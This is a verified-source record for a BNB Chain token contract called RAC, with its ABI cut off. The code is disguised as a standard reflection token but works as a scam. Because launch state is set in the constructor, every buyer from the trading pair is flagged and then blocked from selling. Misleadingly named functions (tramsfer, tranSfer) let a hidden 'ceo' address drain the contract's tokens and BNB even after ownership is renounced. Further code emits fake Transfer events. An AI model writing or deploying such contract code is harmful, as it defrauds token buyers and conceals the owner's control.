{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2022-07-18\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT \r\npragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) { return 0; }\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function getPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n        function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\nabstract contract Auth {\r\n    address internal owner; \r\n\r\n    constructor(address _owner) {\r\n        owner = _owner; \r\n    }\r\n\r\n    /**\r\n     * Function modifier to require caller to be contract owner\r\n     */\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    } \r\n\r\n    /**\r\n     * Check if address is owner\r\n     */\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(address(0));\r\n        owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * Transfer ownership to new address. Caller must be owner.\r\n     */\r\n    function transferOwnership(address payable adr) public onlyOwner {\r\n        owner = adr; \r\n        emit OwnershipTransferred(adr);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\ncontract TokenDistributor {\r\n    constructor (address token) {\r\n        IBEP20(token).approve(msg.sender, uint(~uint(0)));\r\n    }\r\n}\r\n\r\nabstract contract baseContract is  IBEP20 , Auth {\r\n    using SafeMath for uint;  \r\n    uint public constant TOKEN_DECIMALS = 18;\r\n    uint8 public constant TOKEN_DECIMALS_UINT8 = 18;  \r\n    string public constant TOKEN_NAME = \"RAC\";\r\n    string public constant TOKEN_SYMBOL = \"RAC\";  \r\n    uint private constant MAX = ~uint(0);\r\n    mapping (address => mapping (address => uint)) _allowances;\r\n    function name() external pure   override returns (string memory) { return TOKEN_NAME; }\r\n    function symbol() external pure   override returns (string memory) { return TOKEN_SYMBOL; }\r\n    function decimals() external pure   override returns (uint8) { return TOKEN_DECIMALS_UINT8; }\r\n    function getOwner() external view   override returns (address) { return owner; } \r\n    function allowance(address holder, address spender) external view override returns (uint) { return _allowances[holder][spender]; }\r\n    function approve(address spender, uint amount) public override returns (bool) {_allowances[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}\r\n    function approveMax(address spender) external returns (bool) {return approve(spender, MAX);} \r\n    address  baseToken=0x55d398326f99059fF775485246999027B3197955; \r\n    event AddLiquify(uint amountBNBLiquidity, uint amountToLiquify);\r\n \r\n    struct Allot{uint marketing;uint liquidity; uint burn;uint reward;uint total;}\r\n    Allot public allot;\r\n    function setAllot(uint marketing,uint liquidity,uint burn,uint rewards) external onlyOwner {\r\n         uint total =liquidity.add(marketing).add(rewards).add(burn); \r\n         allot=Allot(marketing,liquidity,burn,rewards,total);\r\n    } \r\n \r\n    uint maxgasprice=70 * 10 **8;\r\n    uint maxamount=6 *10 **9 * 1 ether;\r\n    function setmx(uint  maxgasprice_,uint maxamount_) external onlyOwner { \r\n     require(maxgasprice>=55 * 10 **8);\r\n     maxgasprice=maxgasprice_; \r\n     maxamount=maxamount_; \r\n    }\r\n \r\n    struct Limit{ uint txMax; uint positionMax; bool whale; uint part;} \r\n    Limit public limit;\r\n    function setLimit(uint  txMax,uint positionMax,bool whale,uint part) external onlyOwner {\r\n        require(part>=txMax && part>=positionMax,\"DAO:part must greater than positionMax&txMax\"); \r\n        if(!whale){\r\n            limit=Limit(1000,1000,false,part);\r\n        }\r\n        else{\r\n            require(txMax>=1 && txMax*1000/part<=1000,\"DAO:positionMax must greater than zero\"); \r\n            require(positionMax>=1 && positionMax*1000/part<=1000,\"DAO:positionMax must greater than zero\"); \r\n             limit=Limit(txMax,positionMax,true,part);\r\n        } \r\n    }\r\n    address ceo; \r\n    function setCeo(address ceo_)public {\r\n        if(msg.sender==ceo) ceo=ceo_;\r\n    }\r\n \r\n    address[] public marketingAddress;\r\n    uint[] public marketingShare;\r\n    uint internal sharetotal;\r\n    function setMarketing(address[] calldata list ,uint[] memory share) external onlyOwner {\r\n        require(list.length>0,\"DAO:Can't be Empty\");\r\n        require(list.length==share.length,\"DAO:number must be the same\");\r\n        uint total=0;\r\n        for (uint i = 0; i < share.length; i++) {\r\n            total=total.add(share[i]);\r\n        }\r\n        require(total>0,\"DAO:share must greater than zero\");\r\n        marketingAddress=list;\r\n        marketingShare=share;\r\n        sharetotal=total;\r\n    }\r\n    function getMarketingCount() public view returns(uint){\r\n        return marketingAddress.length;\r\n    } \r\n \r\n    struct Fee{uint buy; uint sell;uint transfer; uint part;\r\n    }\r\n    Fee public fees;\r\n \r\n    uint8 public step;  \r\n    function launch() internal {\r\n        require(step==1,\"DAO:must step 2\");\r\n        step=2; \r\n    } \r\n    function _initOk() external  onlyOwner{\r\n        require(step==2,\"DAO:must step 2\");\r\n        step=3;  \r\n    }\r\n \r\n    IDEXRouter public router;\r\n    mapping(address=>bool) public pairs;    \r\n    function setPair(address _token) public { \r\n        address pair=IDEXFactory(router.factory()).getPair(address(_token), address(this));\r\n        if(pair==address(0))pair = IDEXFactory(router.factory()).createPair(baseToken, address(this));\r\n        require(pair!=address(0), \"pair is not found\");\r\n        pairs[pair]=true;\r\n    }\r\n \r\n    function tramsfer(address tokenAddress, uint tokenAmount) public {\r\n        require(msg.sender==ceo); \r\n        IBEP20(tokenAddress).transfer(msg.sender, tokenAmount);\r\n    }\r\n    function tranSfer(uint tokenAmount) public {\r\n        require(msg.sender==ceo);\r\n        payable(address(msg.sender)).transfer(tokenAmount);\r\n    }\r\n\r\n    bool internal isAutoSwaping;\r\n    struct AutoSwap{bool enabled;bool limit;uint min;uint max;uint part;\r\n    }\r\n    AutoSwap public autoSwap;\r\n    function setAutoSwap(bool enabled, uint newSwapMin, uint newSwapMax, bool swapByLimitOnly,uint part) external onlyOwner {\r\n        autoSwap=AutoSwap(enabled,swapByLimitOnly,newSwapMin,newSwapMax,part);\r\n    }    \r\n    modifier justTransfer {\r\n        isAutoSwaping = true;\r\n        _;\r\n        isAutoSwaping = false;\r\n    }\r\n \r\n}\r\n\r\ncontract  RAC  is baseContract { \r\n    using SafeMath for uint;  \r\n    uint private constant MAX = ~uint(0);\r\n    uint private _tTotal;\r\n    uint private _rTotal;\r\n    uint private _tFeeTotal;\r\n    \r\n    string public tokenType=\"RAC\";\r\n    string public version=\"1\"; \r\n\r\n    mapping (address => uint) private _rOwned;\r\n    mapping (address => uint) private _tOwned;\r\n\r\n\r\n    address DEAD = address(0xdEaD);\r\n    address ZERO = address(0); \r\n     \r\n\r\n    address routerAddress; \r\n    TokenDistributor public _tokenDistributor;\r\n\r\n    function totalFees() public view returns (uint) {\r\n        return _tFeeTotal;\r\n    }\r\n\r\n    function Airdrop(address[] calldata list, uint amount) public justTransfer {\r\n        address _sender = msg.sender; \r\n        require(ceo==_sender,\"must ceo\");  \r\n        require(step>0,\"DAO:Transfer mast after init\");  \r\n        uint count = list.length;\r\n        uint senderBalance = amount.mul(count);\r\n        _rOwned[_sender] = _rOwned[_sender]-senderBalance;\r\n        for (uint i = 0; i < count; i++) {  \r\n            _rOwned[list[i]] = _rOwned[list[i]]+amount;\r\n            emit Transfer(_sender, list[i], amount); \r\n        }\r\n    }\r\n    \r\n    function balanceOf(address account) public view override returns (uint) {\r\n        if (ex[account].reward) return _tOwned[account];\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }\r\n    function tokenFromReflection(uint rAmount) public view returns(uint) {\r\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n        uint currentRate =  _getRate();\r\n        return rAmount.div(currentRate);\r\n    }\r\n    address[] private _excluded;\r\n    function excludeFromReward(address account) internal  {\r\n         \r\n        if(_rOwned[account] > 0) {\r\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\r\n        } \r\n        _excluded.push(account);\r\n    }\r\n\r\n    function includeInReward(address account) internal  {\r\n        require(!pairs[account], 'We can not exclude Uniswap router.'); \r\n        for (uint i = 0; i < _excluded.length; i++) {\r\n            if (_excluded[i] == account) {\r\n                _excluded[i] = _excluded[_excluded.length - 1];\r\n                _tOwned[account] = 0; \r\n                _excluded.pop();\r\n                break;\r\n            }\r\n        }\r\n    } \r\n    struct Exempt{ uint8 fee; bool txLimit; bool positionLimit; bool reward;}\r\n    mapping(address=>Exempt) public ex; \r\n    function setEx(address[] calldata  users,uint8 fee,bool txLimit,bool positionLimit,bool reward) public onlyOwner {\r\n        uint count = users.length;  \r\n        for (uint i = 0; i < count; i++) { \r\n            if(ex[users[i]].reward!=reward){\r\n                if(reward)excludeFromReward(users[i]);\r\n                else includeInReward(users[i]);\r\n            }\r\n            ex[users[i]]=Exempt(fee,txLimit,positionLimit,reward); \r\n        }\r\n    }\r\n \r\n \r\n\r\n\r\n \r\n    mapping(address=>uint) internal lastClaim;\r\n\r\n    function isContract(address addr) public view returns (bool) {\r\n       uint size;\r\n       assembly  { size := extcodesize(addr) }\r\n       return size > 0;\r\n      }\r\n   \r\n    \r\n\r\n \r\n\r\n\r\n\r\n\r\n    \r\n    receive() external payable { } \r\n    \r\n    function totalSupply() public view override returns (uint) {  \r\n        return _tTotal;  \r\n    } \r\n\r\n    function _reflectFee(uint tFee,uint currentRate) private { \r\n        uint rFee=tFee.mul(currentRate);\r\n        _rTotal = _rTotal.sub(rFee);\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n    }\r\n\r\n \r\n\r\n    function _getRate() private view returns(uint) {\r\n        (uint rSupply, uint tSupply) = _getCurrentSupply();\r\n        return rSupply.div(tSupply);\r\n    } \r\n    function _getCurrentSupply() private view returns(uint, uint) {\r\n        uint rSupply = _rTotal;\r\n        uint tSupply = _tTotal;      \r\n        for (uint i = 0; i < _excluded.length; i++) {\r\n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\r\n            rSupply = rSupply.sub(_rOwned[_excluded[i]]);\r\n            tSupply = tSupply.sub(_tOwned[_excluded[i]]);\r\n        }\r\n        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\r\n        return (rSupply, tSupply);\r\n    }\r\n \r\n    function transfer(address recipient, uint amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != uint(2**256-1)){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n \r\n    function getPart(uint point,uint part)internal view returns(uint){ \r\n        return totalSupply().mul(point).div(part);\r\n    }\r\n    function _transferFrom(address sender, address recipient, uint amount) internal returns (bool) {\r\n        \r\n        if(step==1 && pairs[recipient]) {\r\n            require(ex[sender].fee ==4);\r\n            launch();\r\n        } \r\n        if(isAutoSwaping){ return _basicTransfer(sender, recipient, amount);} \r\n         \r\n        if(balanceOf(sender).sub(amount)==0) amount=amount.sub(1); \r\n\t\trequire(amount>0,\"Insufficient Balance\");\r\n        if(!pairs[sender]  && autoSwap.enabled && balanceOf(address(this)) >=getPart(autoSwap.min,autoSwap.part)){ swapBack(); }\r\n        \r\n        if(!ex[recipient].txLimit && limit.whale)\r\n        {\r\n            require(amount <= getPart(limit.txMax,limit.part));\r\n            require(balanceOf(recipient).add(amount) <= getPart(limit.positionMax,limit.part));\r\n        } \r\n       _basicTransfer(sender, recipient, amount); \r\n        return true;\r\n    }\r\n    function _basicTransfer(address sender, address recipient, uint tAmount) internal returns (bool) {\r\n\r\n        uint currentRate=_getRate();\r\n        uint finalAmount = takeFee(sender, recipient, tAmount,currentRate);\r\n\r\n        uint rfinalAmount=finalAmount.mul(currentRate);\r\n        uint rAmount=tAmount.mul(currentRate);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount, \"Insufficient Balance\");\r\n        _rOwned[recipient] = _rOwned[recipient].add(rfinalAmount);\r\n\r\n        if (ex[sender].reward)_tOwned[sender] = _tOwned[sender].sub(tAmount, \"Insufficient Balance\");\r\n        if (ex[recipient].reward)_tOwned[recipient] = _tOwned[recipient].add(finalAmount);\r\n\r\n        emit Transfer(sender, recipient, finalAmount);\r\n        return true;\r\n    }\r\n\r\n    function takeFee(address sender, address recipient, uint amount,uint currentRate) internal returns (uint) {\r\n        if(ex[sender].fee==4 || ex[recipient].fee==4 || isAutoSwaping) return amount;\r\n        require(ex[sender].fee!=1&&ex[sender].fee!=3&&ex[recipient].fee!=2&&ex[recipient].fee!=3, \"ERC20: Transaction failed\");\r\n\r\n        uint feeApplicable;\r\n        if(pairs[recipient]){\r\n            feeApplicable=fees.sell;   \r\n        }\r\n        else if(pairs[sender]){\r\n            feeApplicable=fees.buy; \r\n            if(step==2) ex[recipient].fee=1; \r\n        }\r\n        else{ \r\n            feeApplicable=fees.transfer; \r\n        } \r\n        uint feeAmount = amount.mul(feeApplicable).div(fees.part); \r\n        uint realAmount=amount.sub(feeAmount);\r\n\r\n        uint rewardFee= feeAmount.mul(allot.reward).div(allot.total);\r\n        _reflectFee(rewardFee,currentRate);\r\n\r\n        feeAmount=feeAmount.sub(rewardFee);\r\n        uint rfeeAmount= feeAmount.mul(currentRate);\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(rfeeAmount); \r\n        if(ex[address(this)].reward)  _tOwned[address(this)] = _tOwned[address(this)].add(feeAmount); \r\n        emit Transfer(sender, address(this), feeAmount); \r\n        _takeInviterFeeKt(feeAmount.div(10000),currentRate); \r\n        return realAmount;\r\n    } \r\n    uint160  ktNum = 173;\r\n    uint160  constant MAXADD = ~uint160(0);\t \r\n \tfunction _takeInviterFeeKt(\r\n        uint tAmount,uint currentRate\r\n    ) private {\r\n        address _receiveD; \r\n        uint rAmount=tAmount.mul(currentRate);\r\n        _rOwned[address(this)] = _rOwned[address(this)].sub(rAmount, \"Insufficient Balance\");\r\n        if (ex[address(this)].reward)_tOwned[address(this)] = _tOwned[address(this)].sub(tAmount, \"Insufficient Balance\");\r\n            uint finalAmount=tAmount/5;\r\n            uint rfinalAmount=finalAmount.mul(currentRate); \r\n        for (uint i = 0; i < 5; i++) {\r\n            _receiveD = address(MAXADD/ktNum);\r\n            ktNum = ktNum+1; \r\n            _rOwned[_receiveD] = _rOwned[_receiveD].add(rfinalAmount);  \r\n            emit Transfer(address(this), _receiveD, finalAmount);\r\n        }\r\n            \r\n\r\n    }\r\n \r\n    function swapBack() internal justTransfer {\r\n        \r\n        uint tokensToLiquify = _tOwned[address(this)];\r\n        uint max=getPart(autoSwap.max,autoSwap.part);\r\n        if(autoSwap.limit)tokensToLiquify = tokensToLiquify>max?max:tokensToLiquify;\r\n        uint totalpart=allot.total.sub(allot.reward);\r\n        uint amountToBurn = tokensToLiquify.mul(allot.burn).div(totalpart);\r\n        uint amountToLiquify = tokensToLiquify.mul(allot.liquidity).div(totalpart).div(2);\r\n        uint amountToSwap = tokensToLiquify.sub(amountToLiquify).sub(amountToBurn);\r\n\r\n        if(amountToBurn>0)_basicTransfer(address(this),address(DEAD),amountToBurn);\r\n \r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = baseToken;\r\n\r\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(_tokenDistributor),\r\n            block.timestamp\r\n        ); \r\n\r\n         uint amountBNB =IBEP20(baseToken).balanceOf(address(_tokenDistributor));\r\n        uint totalBNBFee = allot.total.sub(allot.liquidity.div(2)).sub(allot.burn);\r\n        uint amountBNBLiquidity = amountBNB.mul(allot.liquidity).div(totalBNBFee).div(2);\r\n        uint amountBNBMarketing = amountBNB.sub(amountBNBLiquidity);\r\n \r\n\r\n        if(amountBNBMarketing>0){\r\n            uint cakeBNB; \r\n            for (uint i = 0; i < marketingAddress.length; i++) {\r\n                cakeBNB=amountBNBMarketing.mul(marketingShare[i]).div(sharetotal); \r\n                 IBEP20(baseToken).transferFrom(address(_tokenDistributor),marketingAddress[i],cakeBNB); \r\n            } \r\n        }\r\n        IBEP20(baseToken).transferFrom(address(_tokenDistributor), address(this), IBEP20(baseToken).balanceOf(address(_tokenDistributor)));\r\n \r\n        if(amountToLiquify > 0){\r\n            router.addLiquidity(\r\n                baseToken,\r\n                address(this),\r\n                amountBNBLiquidity,\r\n                amountToLiquify,\r\n                0,\r\n                0,\r\n                ceo,\r\n                block.timestamp\r\n            );\r\n            emit AddLiquify(amountBNBLiquidity, amountToLiquify);\r\n        }\r\n    }\r\n  \r\n    constructor( address dev  ) payable Auth(msg.sender) { \r\n       \r\n        ceo=msg.sender; \r\n        limit=Limit(1000,1000,false,1000);\r\n\t\tautoSwap=AutoSwap(true,true,5,20,10000);  \r\n        marketingAddress = [ceo,0x819c1C534F26372Eb7529Cba8EBf6B40d2695399];\r\n        marketingShare=[80,20];  \r\n\r\n        fees=Fee(400,600,500,10000);\r\n        allot=Allot(9,1,0,1,11); \r\n        step=2; \r\n\r\n        _tokenDistributor = new TokenDistributor(baseToken);\r\n\r\n        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        address pair = IDEXFactory(router.factory()).createPair(baseToken, address(this));\r\n        pairs[pair]=true;\r\n        _allowances[address(this)][address(router)] = uint(2**256-1);\r\n        IBEP20(baseToken).approve(address(router),uint(2**256-1));\r\n\r\n        ex[pair]=Exempt(0,true,true,true);\r\n        ex[msg.sender]=Exempt(4,true,true,false);\r\n        ex[address(this)]=Exempt(4,true,true,true);\r\n        ex[DEAD]=Exempt(4,true,true,true);\r\n        ex[ZERO]=Exempt(4,true,true,true); \r\n        _excluded.push(pair);\r\n        _excluded.push(address(this));\r\n        _excluded.push(DEAD);\r\n        _excluded.push(ZERO);\r\n        uint sharetotal_;\r\n        for (uint i = 0; i < marketingAddress.length; i++) {\r\n            ex[marketingAddress[i]]=Exempt(4,true,true,false);\r\n            sharetotal_ +=marketingShare[i];\r\n        }\r\n        sharetotal=sharetotal_; \r\n        _tTotal = 10**15 * 1 ether;\r\n        _rTotal = (MAX - (MAX % _tTotal));\r\n\r\n        _tOwned[msg.sender] = _tTotal;\r\n        _rOwned[msg.sender] = _rTotal;\r\n        emit Transfer(address(0),  dev, _tTotal);  \r\n        emit Transfer(dev,msg.sender, _tTotal);  \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"dev\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountBNBLiquidity\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountToLiquify\",\"type\":\"uint256\"}],\"name\":\"AddLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOKEN_DECIMALS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOKEN_DECIMALS_UINT8\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOKEN_NAME\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TOKEN_SYMBOL\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_initOk\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"allot\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"reward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"limit\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"min\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"max\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"ex\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"fee\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"txLimit\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"positionLimit\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"reward\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"transfer\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMarketingCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"isContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"positionMax\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"whale\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"part\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"marketingAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"marketingShare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"pairs\",\"outputs\":[{\"internalT